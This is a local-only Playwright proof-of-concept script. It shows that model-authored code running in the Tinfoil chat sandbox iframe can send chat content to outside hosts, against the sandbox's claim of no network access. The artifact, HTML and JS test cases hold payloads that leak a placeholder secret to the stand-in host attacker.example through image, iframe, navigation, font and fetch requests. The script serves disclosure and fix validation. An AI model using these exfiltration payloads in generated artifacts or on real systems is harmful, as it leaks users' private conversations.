// PoC A: model-authored code running on the Tinfoil sandbox origin can reach
// arbitrary https hosts (image load, iframe load, self-navigation, font load),
// contrary to the sandbox README ("none of them can reach the network").
//
// LOCAL ONLY. Every origin below is served by Playwright route interception
// from the local repo copies; Chromium is additionally started with
// `--host-resolver-rules=MAP * ~NOTFOUND` so no hostname can resolve.
//
//   https://chat.tinfoil.sh/            fake chat page: the exact embedding
//                                       logic of sandbox-frame.tsx/ArtifactPreview.tsx
//                                       (sandbox="allow-scripts", nonce handshake)
//                                       served with the production chat CSP
//                                       from tinfoil-webapp/vercel.json.
//   https://webapp-sandbox.tinfoil.sh/  the built dist/ of tinfoil-webapp-sandbox
//                                       (commit 54ed549) served with the exact
//                                       production-host headers of its vercel.json.
//   https://attacker.example/           the attacker's collector; every request
//                                       that reaches it is recorded.
//
// Usage: LD_LIBRARY_PATH=../syslibs/root/usr/lib/x86_64-linux-gnu node sandbox-exfil.mjs
import { chromium } from 'playwright'
import fs from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const SANDBOX_REPO = path.resolve(HERE, '../tinfoil-webapp-sandbox')
const WEBAPP_REPO = path.resolve(HERE, '../tinfoil-webapp')
const DIST = path.join(SANDBOX_REPO, 'dist')
const OUT = path.join(HERE, 'out')
fs.mkdirSync(OUT, { recursive: true })

// ---- exact production headers -------------------------------------------------
const sandboxVercel = JSON.parse(fs.readFileSync(path.join(SANDBOX_REPO, 'vercel.json'), 'utf8'))
function sandboxHeadersFor(pathname) {
  // Vercel semantics as the repo's own test/serve.mjs models them: every block
  // whose `source` matches applies, later blocks override. We keep only the
  // blocks that apply to the production host webapp-sandbox.tinfoil.sh.
  const out = {}
  for (const block of sandboxVercel.headers) {
    const re = new RegExp('^' + block.source.replace(/\(\.\*\)/g, '.*') + '$')
    if (!re.test(pathname)) continue
    if (block.missing) continue
    if (block.has && !block.has.every((c) => c.type === 'host' && c.value === 'webapp-sandbox.tinfoil.sh')) continue
    for (const h of block.headers) out[h.key] = h.value
  }
  return out
}
// Fix validation: SANDBOX_CSP_OVERRIDE replaces the Content-Security-Policy of
// every sandbox response (the frame-ancestors part is kept as in production).
const CSP_OVERRIDE = process.env.SANDBOX_CSP_OVERRIDE || null
const chatVercel = JSON.parse(fs.readFileSync(path.join(WEBAPP_REPO, 'vercel.json'), 'utf8'))
const CHAT_CSP = chatVercel.headers[0].headers.find((h) => h.key === 'Content-Security-Policy').value

// ---- fake chat page: same embedding as sandbox-frame.tsx + ArtifactPreview.tsx ----
const CHAT_HTML = `<!doctype html><html><body><script src="/chat.js"></script></body></html>`
// The chat CSP is script-src 'self': the embedding logic is served as a same-origin script, as the real bundle is.
const CHAT_JS = `
  window.received = []
  window.embed = (run) => new Promise((resolve) => {
    document.querySelector('iframe')?.remove(); window.received = []
    const f = document.createElement('iframe')
    f.setAttribute('sandbox', 'allow-scripts')          // ArtifactPreview.tsx:257, code-block.tsx:298
    f.setAttribute('referrerpolicy', 'no-referrer')
    const nonce = crypto.randomUUID()                    // sandbox-frame.tsx:62
    f.src = 'https://webapp-sandbox.tinfoil.sh/preview#' + nonce
    const onMessage = (e) => {
      if (e.source !== f.contentWindow) return          // sandbox-frame.tsx:76
      if (e.data?.type === 'tinfoil-sandbox-ready') {
        if (e.data.nonce !== nonce) return              // sandbox-frame.tsx:78
        f.contentWindow.postMessage(run, '*'); resolve(true)
        return
      }
      window.received.push(e.data)
    }
    window.addEventListener('message', onMessage)
    document.body.appendChild(f)
  })
`

const PNG_1x1 = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=', 'base64')

const browser = await chromium.launch({
  args: ['--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE localhost'],
})
const page = await browser.newPage()
const attackerLog = []
const cspViolations = []
page.on('console', (m) => { if (/Content.Security.Policy|Refused to/.test(m.text())) cspViolations.push(m.text().slice(0, 160)) })

await page.route('**/*', async (route) => {
  const req = route.request()
  const url = new URL(req.url())
  if (url.origin === 'https://chat.tinfoil.sh') {
    if (url.pathname === '/chat.js') return route.fulfill({ status: 200, headers: { 'content-type': 'text/javascript; charset=utf-8' }, body: CHAT_JS })
    return route.fulfill({ status: 200, headers: { 'content-type': 'text/html; charset=utf-8', 'content-security-policy': CHAT_CSP }, body: CHAT_HTML })
  }
  if (url.origin === 'https://webapp-sandbox.tinfoil.sh') {
    let p = url.pathname
    let file = path.join(DIST, p)
    if (!fs.existsSync(file) && fs.existsSync(file + '.html')) file += '.html' // cleanUrls
    if (!fs.existsSync(file)) return route.fulfill({ status: 404, body: 'not found' })
    const type = file.endsWith('.html') ? 'text/html; charset=utf-8' : 'text/javascript; charset=utf-8'
    const headers = { ...sandboxHeadersFor(p), 'content-type': type }
    if (CSP_OVERRIDE) headers['Content-Security-Policy'] = CSP_OVERRIDE
    return route.fulfill({ status: 200, headers, body: fs.readFileSync(file) })
  }
  if (url.origin === 'https://attacker.example') {
    attackerLog.push({ url: req.url(), frameUrl: req.frame().url(), resourceType: req.resourceType(), referer: req.headers()['referer'] ?? null, origin: req.headers()['origin'] ?? null, secFetchDest: req.headers()['sec-fetch-dest'] ?? null })
    if (url.pathname === '/frame') {
      // The attacker's page, now running inside the sandboxed chain, has no CSP of its own and can talk back home.
      return route.fulfill({ status: 200, headers: { 'content-type': 'text/html' }, body: `<script>fetch('https://attacker.example/beacon?d=' + encodeURIComponent('fetched-from-attacker-frame:' + location.search)).then(()=>{}, ()=>{})</script>` })
    }
    if (url.pathname === '/font') return route.fulfill({ status: 200, headers: { 'content-type': 'font/woff2' }, body: Buffer.alloc(8) })
    if (url.pathname === '/img') return route.fulfill({ status: 200, headers: { 'content-type': 'image/png' }, body: PNG_1x1 })
    return route.fulfill({ status: 200, headers: { 'content-type': 'text/html' }, body: '<p>attacker got it</p>' })
  }
  // Anything else (tinfoil production, apple, ...) is refused outright.
  attackerLog.push({ url: req.url(), UNEXPECTED: true })
  return route.abort('blockedbyclient')
})

await page.goto('https://chat.tinfoil.sh/')
const results = {}
async function run(name, runMessage, expectPaths, settleMs = 1500) {
  attackerLog.length = 0
  cspViolations.length = 0
  await page.evaluate((r) => window.embed(r), runMessage)
  await page.waitForTimeout(settleMs)
  const hits = attackerLog.map((e) => (e.UNEXPECTED ? 'UNEXPECTED ' + e.url : `${e.resourceType} ${e.url} (frame=${e.frameUrl}, referer=${e.referer}, origin=${e.origin}, sec-fetch-dest=${e.secFetchDest})`))
  results[name] = { reachedAttacker: hits, cspViolations: [...cspViolations] }
  const got = expectPaths.every((p) => attackerLog.some((e) => e.url.includes(p)))
  console.log(`[${got ? 'LEAK' : 'no leak'}] ${name}`)
  for (const h of hits) console.log('    ' + h)
  for (const v of cspViolations) console.log('    csp: ' + v)
}

const SECRET = 'CONFIDENTIAL_CHAT_CONTENT'

// Legitimate flows (must keep working under any proposed CSP change).
async function legit(name, runMessage, pred) {
  await page.evaluate((r) => window.embed(r), runMessage)
  let ok = false
  try { await page.waitForFunction(pred, null, { timeout: 8000 }); ok = true } catch {}
  results['legit: ' + name] = ok ? 'ok' : 'BROKEN ' + JSON.stringify(await page.evaluate(() => window.received)).slice(0, 200)
  console.log(`[${ok ? 'ok' : 'BROKEN'}] legit: ${name}`)
}
await legit('html preview reports its height', { type: 'tinfoil-sandbox-run', kind: 'html', instanceId: 'L1', code: '<h1 style="height:300px">Hello</h1>' },
  () => window.received.some((m) => m.type === 'html-preview-height' && m.instanceId === 'L1' && m.height >= 300))
await legit('js preview reports console output', { type: 'tinfoil-sandbox-run', kind: 'js', instanceId: 'L2', code: 'console.log("hi"); 1+2' },
  () => window.received.some((m) => m.type === 'js-preview-output' && m.instanceId === 'L2' && m.output.join() === 'hi,→ 3'))
await legit('artifact runs inline script with storage shims and data: images', { type: 'tinfoil-sandbox-run', kind: 'artifact', instanceId: 'L3', html: '<!doctype html><html><body><img src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><script>localStorage.setItem("k","v");parent.postMessage({type:"artifact-ok",instanceId:"L3",v:localStorage.getItem("k")},"*")</script></body></html>' },
  () => window.received.some((m) => m.type === 'artifact-ok' && m.v === 'v'))

// 1. GenUI HTML artifact (render_artifact_preview {type:'html'}), as the chat
//    posts it after the user clicks "Preview": no CSP is injected by either side.
await run('artifact: <img> to attacker (img-src https:)',
  { type: 'tinfoil-sandbox-run', kind: 'artifact', instanceId: 'a1', html: `<!doctype html><html><body><img src="https://attacker.example/img?d=${SECRET}-via-img"></body></html>` },
  ['/img?d='])
await run('artifact: <iframe> to attacker page, which fetches home (frame-src https:)',
  { type: 'tinfoil-sandbox-run', kind: 'artifact', instanceId: 'a2', html: `<!doctype html><html><body><iframe src="https://attacker.example/frame?d=${SECRET}-via-frame"></iframe></body></html>` },
  ['/frame?d=', '/beacon?d='])
await run('artifact: self-navigation of the nested frame',
  { type: 'tinfoil-sandbox-run', kind: 'artifact', instanceId: 'a3', html: `<!doctype html><html><body><script>location.href='https://attacker.example/nav?d=${SECRET}-via-navigation'</script></body></html>` },
  ['/nav?d='])
await run('artifact: @font-face to attacker (font-src https:)',
  { type: 'tinfoil-sandbox-run', kind: 'artifact', instanceId: 'a4', html: `<!doctype html><html><head><style>@font-face{font-family:x;src:url(https://attacker.example/font?d=${SECRET}-via-font)}body{font-family:x}</style></head><body>text</body></html>` },
  ['/font?d='])
await run('artifact: fetch() to attacker (control: connect-src falls to default-src none)',
  { type: 'tinfoil-sandbox-run', kind: 'artifact', instanceId: 'a5', html: `<!doctype html><html><body><script>fetch('https://attacker.example/fetch?d=${SECRET}').catch(()=>{})</script></body></html>` },
  ['/fetch?d='])

// 2. ```html code-block preview (kind html): the per-kind <meta> CSP blocks
//    img/fetch, but a navigation of the frame itself is governed only by the
//    *embedder's* frame-src, which is `https:`.
await run('html preview: <img> to attacker (control: meta CSP img-src data:)',
  { type: 'tinfoil-sandbox-run', kind: 'html', instanceId: 'h1', code: `<img src="https://attacker.example/img?d=${SECRET}-html-img">` },
  ['/img?d='])
await run('html preview: self-navigation of the nested frame',
  { type: 'tinfoil-sandbox-run', kind: 'html', instanceId: 'h2', code: `<script>location.href='https://attacker.example/nav?d=${SECRET}-html-navigation'</script>` },
  ['/nav?d='])

// 3. ```javascript code-block preview (kind js): eval'd snippet.
await run('js preview: fetch() to attacker (control: default-src none)',
  { type: 'tinfoil-sandbox-run', kind: 'js', instanceId: 'j1', code: `fetch('https://attacker.example/fetch?d=${SECRET}-js').catch(()=>{}); 1` },
  ['/fetch?d='])
await run('js preview: self-navigation of the nested frame',
  { type: 'tinfoil-sandbox-run', kind: 'js', instanceId: 'j2', code: `location.href='https://attacker.example/nav?d=${SECRET}-js-navigation'; 1` },
  ['/nav?d='])

await browser.close()
const outFile = path.join(OUT, CSP_OVERRIDE ? 'sandbox-exfil-results-hardened-csp.json' : 'sandbox-exfil-results.json')
fs.writeFileSync(outFile, JSON.stringify({ chatCsp: CHAT_CSP, sandboxPreviewHeaders: sandboxHeadersFor('/preview'), cspOverride: CSP_OVERRIDE, results }, null, 2))
console.log('\nresults written to', outFile)
